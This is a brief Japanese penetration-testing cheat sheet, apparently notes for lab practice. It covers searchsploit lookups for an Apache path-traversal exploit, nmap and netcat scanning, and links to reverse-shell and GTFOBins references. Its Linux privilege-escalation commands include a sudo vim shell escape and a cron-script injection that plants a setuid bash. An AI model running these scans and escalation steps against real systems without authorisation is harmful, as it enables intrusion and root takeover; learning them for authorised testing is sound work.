# Pentest

- https://www.exploit-db.com/

## searchsploit

- https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013

```zsh
searchsploit --update
searchsploit apache 2.4.49
apache -m multiple/webapps/50383.sh
```
## nmap

```zsh
## 全 TCP ポートの検査 (早い)
nmap $target -sS -p-

## 特定のポートを指定して詳細チェック
nmap $target -A -p23,80,443

## ファイルに残す
nmap 10.10.10.10 -p1-1024 -Pn -A -oA nmap
```

## netcat

```zsh
for i in {1..254};do (ping -c 1 10.10.10.$i|grep ttl&);done

nc -z 10.10.10.10 1-65535
```

## SecLists

- https://github.com/danielmiessler/SecLists

## リバースシェル

- https://www.revshells.com/
- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#reverse-shell

## sudo で特権昇格に使えるコマンド

- https://gtfobins.org/
- https://gtfobins.org/gtfobins/mysql/
- https://gtfobins.org/gtfobins/git/

## setuid のビットが立っているコマンド

```zsh
find / -perm -4000 -exec ls -la {} \; 2>/dev/null
```


## sudo 権限の一覧

```zsh
sudo -l
```

## vim で bash を起動

```zsh
sudo -u user1 vim -c ':!/bin/sh'
```

## プロセスのスヌーピング

- https://github.com/DominicBreuker/pspy unprivileged Linux process snooping

cron で root 権限で実行されているファイルに書き込み可能であれば、下記のように setuid の bash を生成できる

```zsh
echo 'cp /bin/bash /tmp/a; chmod +s /tmp/a' >> /foo/bar.sh

/tmp/a -p
```

## 権限昇格の脆弱性チェック

- https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS Linux Privilege Escalation Awesome Script

```
linpeas.sh >result 2>&1


less -R result
```
